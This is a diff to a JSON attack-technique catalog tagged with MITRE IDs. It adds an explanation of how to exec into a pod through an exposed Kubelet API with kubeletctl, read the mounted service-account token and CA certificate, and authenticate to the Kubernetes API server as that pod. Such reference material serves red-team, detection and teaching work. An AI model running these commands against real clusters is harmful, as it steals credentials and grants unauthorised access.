@@ -107,5 +107,6 @@
       "MITRE T1528",
       "MITRE T1078.004"
     ]
-  }
+  },
+  "explain": "Runs a command in an exposed pod via the Kubelet API and steals its identity:\n  kubeletctl -i --server <ip>   the Kubelet API (10250), ignoring TLS errors\n  exec \"id\" -p <pod> -c <container>   execute a command in this pod/container\nThen cat /var/run/secrets/kubernetes.io/serviceaccount/token and ca.crt to grab the mounted service-account token and CA, and authenticate to the API server as that pod (kubectl auth can-i --list to see what it can do)."
 }
